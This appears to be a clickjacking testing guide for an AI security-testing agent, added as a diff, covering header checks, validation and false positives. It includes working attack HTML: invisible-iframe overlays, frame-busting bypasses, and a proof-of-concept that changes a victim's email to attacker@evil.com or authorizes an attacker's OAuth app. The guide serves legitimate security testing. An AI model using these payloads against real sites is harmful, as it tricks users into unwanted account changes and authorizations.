@@ -1,0 +1,393 @@
+<clickjacking_guide>
+<title>CLICKJACKING</title>
+
+<critical>Clickjacking allows attackers to trick users into clicking invisible or disguised elements on a page overlaid on a legitimate site. This can lead to unauthorized actions like changing settings, making purchases, or transferring funds. While generally lower severity than injection attacks, clickjacking on sensitive operations can have significant impact.</critical>
+
+<scope>
+- Missing frame protections: No X-Frame-Options or CSP frame-ancestors
+- Frame-ancestors bypass: Weak or missing CSP directives
+- Frame busting failures: JavaScript frame busting that can be circumvented
+- Partial framing: Some pages protected, others not
+- Mobile-specific: Touch-based clickjacking, tapjacking
+- Multi-click attacks: Complex interactions requiring multiple clicks
+- Drag-and-drop jacking: Exploiting drag-and-drop functionality
+</scope>
+
+<methodology>
+1. Check for X-Frame-Options header in responses.
+2. Check for Content-Security-Policy frame-ancestors directive.
+3. Attempt to frame target pages in an iframe.
+4. Test frame busting scripts for bypasses.
+5. Identify sensitive actions frameable without confirmation.
+6. Create proof-of-concept demonstrating the attack.
+7. Assess actual impact based on frameable functionality.
+</methodology>
+
+<discovery_techniques>
+<check_headers>
+Look for protection headers:
+```bash
+# Check response headers
+curl -sI https://target.com | grep -iE "x-frame-options|content-security-policy"
+
+# Expected protections:
+# X-Frame-Options: DENY
+# X-Frame-Options: SAMEORIGIN
+# Content-Security-Policy: frame-ancestors 'none'
+# Content-Security-Policy: frame-ancestors 'self'
+```
+
+Common responses:
+- No headers = VULNERABLE
+- X-Frame-Options: DENY = Protected
+- X-Frame-Options: SAMEORIGIN = Can be framed by same origin
+- X-Frame-Options: ALLOW-FROM uri = Deprecated, not supported by modern browsers
+- frame-ancestors 'none' = Protected
+- frame-ancestors 'self' = Can be framed by same origin
+</check_headers>
+
+<test_framing>
+Create test HTML:
+```html
+<!DOCTYPE html>
+<html>
+<head><title>Clickjacking Test</title></head>
+<body>
+<h1>Can the target be framed?</h1>
+<iframe src="https://target.com/sensitive-action" width="800" height="600"></iframe>
+</body>
+</html>
+```
+
+Test scenarios:
+1. Can the main page be framed?
+2. Can specific sensitive pages be framed? (change password, delete account)
+3. Do different pages have different protections?
+4. Does framing work with authentication cookies?
+</test_framing>
+
+<frame_busting_analysis>
+Check for JavaScript frame busting:
+```javascript
+// Common frame busters
+if (top !== self) { top.location = self.location; }
+if (parent.frames.length > 0) { top.location = self.location; }
+if (window !== window.top) { window.top.location = window.location; }
+```
+
+Bypass techniques:
+```html
+<!-- Sandbox disables JavaScript -->
+<iframe sandbox="allow-forms" src="https://target.com"></iframe>
+
+<!-- Double framing -->
+<iframe src="data:text/html,<iframe src='https://target.com'></iframe>"></iframe>
+
+<!-- XSS filter (old IE) -->
+<iframe src="https://target.com?<script>"></iframe>
+
+<!-- Blocking onbeforeunload -->
+<iframe src="https://target.com" onbeforeunload="return false;"></iframe>
+```
+</frame_busting_analysis>
+
+<identify_sensitive_actions>
+High-value clickjacking targets:
+- Account settings changes (email, password)
+- Fund transfers, purchases
+- "Authorize" buttons in OAuth flows
+- "Delete account" or "Remove" buttons
+- Admin panel actions
+- Form submissions with side effects
+- Social media interactions (follow, like)
+- Subscription/payment changes
+
+Low-value targets (usually not worth reporting):
+- Read-only pages
+- Logout buttons
+- Navigation links
+- Non-authenticated pages
+</identify_sensitive_actions>
+</discovery_techniques>
+
+<attack_techniques>
+<basic_clickjacking>
+Overlay attack:
+```html
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+iframe {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 800px;
+    height: 600px;
+    opacity: 0.0001;  /* Nearly invisible */
+    z-index: 2;
+}
+.decoy {
+    position: absolute;
+    top: 200px;
+    left: 300px;
+    z-index: 1;
+}
+</style>
+</head>
+<body>
+<button class="decoy">Click here to win a prize!</button>
+<iframe src="https://target.com/delete-account"></iframe>
+</body>
+</html>
+```
+
+Attack flow:
+1. Victim visits attacker page
+2. Sees "Win a prize" button
+3. Clicks button, actually clicks invisible iframe
+4. Account deleted on target site
+</basic_clickjacking>
+
+<multi_step_attack>
+For actions requiring multiple clicks:
+```html
+<script>
+var step = 0;
+var positions = [
+    {top: 100, left: 200},  // First click position
+    {top: 300, left: 400},  // Second click position
+    {top: 500, left: 200}   // Third click position
+];
+
+document.onclick = function(e) {
+    step++;
+    if (step < positions.length) {
+        // Reposition decoy for next click
+        document.querySelector('.decoy').style.top = positions[step].top + 'px';
+        document.querySelector('.decoy').style.left = positions[step].left + 'px';
+    }
+};
+</script>
+```
+</multi_step_attack>
+
+<drag_drop_jacking>
+Exploiting drag-and-drop:
+```html
+<div id="target" draggable="true">Drag this image</div>
+<iframe id="victim" src="https://target.com/admin/settings"></iframe>
+
+<script>
+target.ondragend = function(e) {
+    // User dragged decoy, actually dropped into iframe
+    // Could drop malicious content into forms
+};
+</script>
+```
+</drag_drop_jacking>
+
+<cursor_jacking>
+Moving cursor to different position:
+```html
+<style>
+html { cursor: url('fake-cursor.png') 100 100, auto; }
+</style>
+<!-- Real cursor is 100px offset from visual cursor -->
+```
+</cursor_jacking>
+</attack_techniques>
+
+<exploitation>
+<poc_template>
+Standard clickjacking proof-of-concept:
+```html
+<!DOCTYPE html>
+<html>
+<head>
+<title>Security Test - Clickjacking PoC</title>
+<style>
+body { font-family: Arial, sans-serif; }
+iframe {
+    position: absolute;
+    top: 20px;
+    left: 20px;
+    width: 500px;
+    height: 400px;
+    opacity: 0.3;  /* 0.3 for demo visibility, 0.0001 for real attack */
+    z-index: 2;
+    border: 1px solid red;
+}
+.decoy-button {
+    position: absolute;
+    top: 150px;  /* Adjust to overlay sensitive button */
+    left: 100px;
+    padding: 10px 20px;
+    background: green;
+    color: white;
+    cursor: pointer;
+    z-index: 1;
+}
+</style>
+</head>
+<body>
+<h1>Clickjacking Proof of Concept</h1>
+<p>Click the green button below (victim thinks they're clicking this button, but actually clicks iframe)</p>
+<button class="decoy-button">Click to Win!</button>
+<iframe src="https://vulnerable-target.com/change-email?email=attacker@evil.com"></iframe>
+</body>
+</html>
+```
+
+Steps:
+1. Adjust iframe position so sensitive button overlays decoy
+2. Set opacity to 0.3 for demonstration (visible iframe)
+3. User can see they'd click the target button
+4. For real attack, set opacity near 0
+</poc_template>
+
+<oauth_clickjacking>
+Attacking OAuth authorize page:
+```html
+<!-- If OAuth authorize page is frameable -->
+<iframe src="https://oauth-provider.com/authorize?client_id=attacker&redirect_uri=https://attacker.com&scope=read_private"></iframe>
+<button style="...positioned over authorize button...">Click Here</button>
+
+<!-- Victim authorizes attacker's app unknowingly -->
+```
+</oauth_clickjacking>
+</exploitation>
+
+<validation>
+1. Confirm NO X-Frame-Options and NO frame-ancestors CSP, OR bypasses work.
+2. Verify the page can actually be framed (test in browser, not just header check).
+3. Identify SENSITIVE functionality that is frameable (not just any page).
+4. Create working PoC that demonstrates the attack.
+5. Assess realistic impact: what can attacker make victim do?
+6. Consider if action requires CSRF token (clickjacking alone may not be enough).
+7. Check if confirmation dialog prevents single-click exploitation.
+</validation>
+
+<false_positives>
+- Pages with no sensitive actions (read-only, public info)
+- X-Frame-Options: ALLOW-FROM (deprecated but shows awareness)
+- Pages requiring CSRF token for sensitive actions
+- Multi-step processes with confirmation
+- Frame busting that works in modern browsers
+- Authenticated pages where cookies have SameSite attribute
+- Pages behind login (attacker can't know victim's state)
+</false_positives>
+
+<llm_reasoning_errors>
+COMMON AI MISTAKES THAT CAUSE FALSE POSITIVES - AVOID THESE:
+
+1. ANY PAGE FRAMEABLE:
+   WRONG: "Homepage can be framed, clickjacking vulnerability"
+   RIGHT: Clickjacking requires a SENSITIVE ACTION to exploit:
+          - Framing a static page = no impact
+          - Framing a login page = limited impact (why click login?)
+          - Framing "delete account" = significant impact
+          Focus on pages with state-changing actions.
+
+2. HEADER MISSING = VULNERABLE:
+   WRONG: "X-Frame-Options header missing, confirmed clickjacking"
+   RIGHT: Missing header indicates potential, but:
+          - Page may have no sensitive actions
+          - CSP frame-ancestors may be present instead
+          - Frame busting may be effective
+          Verify actual exploitation is possible.
+
+3. ALLOW-FROM TREATED AS PROTECTION:
+   WRONG: "X-Frame-Options: ALLOW-FROM uri present, page protected"
+   RIGHT: ALLOW-FROM is NOT supported by modern browsers:
+          - Chrome, Firefox, Safari ignore it
+          - Only older IE supported it
+          - Treat as if header is missing
+          Test in actual browser.
+
+4. CSRF PROTECTION IGNORED:
+   WRONG: "Sensitive form frameable, clickjacking to submit malicious form"
+   RIGHT: CSRF tokens often prevent exploitation:
+          - Even if clicked, form submission needs valid token
+          - Token is per-session/per-request
+          - Clickjacking + CSRF protection = limited impact
+          Check if CSRF tokens are required.
+
+5. LOGIN PAGE OVEREMPHASIS:
+   WRONG: "Login page frameable, critical clickjacking vulnerability"
+   RIGHT: Login page clickjacking has limited practical impact:
+          - Victim needs to enter credentials anyway
+          - No pre-filled sensitive data to submit
+          - Usually "informational" not "exploitable"
+          Focus on authenticated state-changing actions.
+
+6. READ-ONLY DATA:
+   WRONG: "User profile page frameable, data exposure via clickjacking"
+   RIGHT: Clickjacking doesn't expose data:
+          - It makes users CLICK, not read
+          - Data in iframe not accessible to attacker
+          - Would need XSS to extract data
+          Clickjacking is about actions, not data theft.
+</llm_reasoning_errors>
+
+<expanded_false_positives>
+FALSE POSITIVE SCENARIOS - DO NOT REPORT:
+
+1. NON-SENSITIVE PAGES:
+   - Homepage / landing pages
+   - Public documentation
+   - Marketing pages
+   - Read-only content
+
+2. PROTECTED ACTIONS:
+   - Forms requiring CSRF tokens
+   - Actions with confirmation dialogs
+   - Multi-factor authentication required
+   - CAPTCHAs on sensitive actions
+
+3. ALTERNATIVE PROTECTIONS:
+   - SameSite cookies preventing cross-origin cookies
+   - JavaScript frame busting that works
+   - Server-side request validation
+
+4. LIMITED IMPACT SCENARIOS:
+   - Login pages (victim must still enter credentials)
+   - Logout buttons (minor impact)
+   - Navigation elements
+   - Search functionality
+
+5. TECHNICAL LIMITATIONS:
+   - X-Content-Type-Options: nosniff (not related but sometimes confused)
+   - Pages that don't function when framed
+   - Single-page apps with client-side routing
+
+6. BROWSER PROTECTIONS:
+   - Modern browsers block some clickjacking by default
+   - Mobile browsers may have different behavior
+   - User interaction requirements
+</expanded_false_positives>
+
+<impact>
+- Unauthorized actions: Delete account, change settings, transfer funds
+- OAuth authorization abuse: Trick users into authorizing malicious apps
+- Social engineering amplification: More convincing attacks via real UI
+- Account takeover: Change email/password via clickjacked form
+- Reputation damage: Post content as victim on social media
+- Financial loss: Unauthorized purchases or transfers
+</impact>
+
+<pro_tips>
+1. Always create a working PoC - header checks alone aren't sufficient proof.
+2. Focus on one-click actions - multi-step attacks are harder but possible.
+3. OAuth authorization pages are high-value clickjacking targets.
+4. Test with actual user session - some actions only matter when authenticated.
+5. Check if SameSite=Strict/Lax cookies prevent cross-origin cookie sending.
+6. X-Frame-Options is per-page - check each sensitive page individually.
+7. ALLOW-FROM is deprecated - treat it as if no protection exists.
+8. CSP frame-ancestors overrides X-Frame-Options when both present.
+9. Some frameworks add frame protection automatically - verify configuration.
+10. Report with clear impact: "Attacker can trick user into [specific action]".
+</pro_tips>
+
+<remember>Clickjacking vulnerabilities require demonstrating that a page with SENSITIVE STATE-CHANGING ACTIONS can be framed. Missing X-Frame-Options alone is not a vulnerability without impact. Create a working PoC showing what action an attacker can trick a victim into performing. Consider CSRF tokens and confirmation dialogs as potential mitigations that reduce impact.</remember>
+</clickjacking_guide>
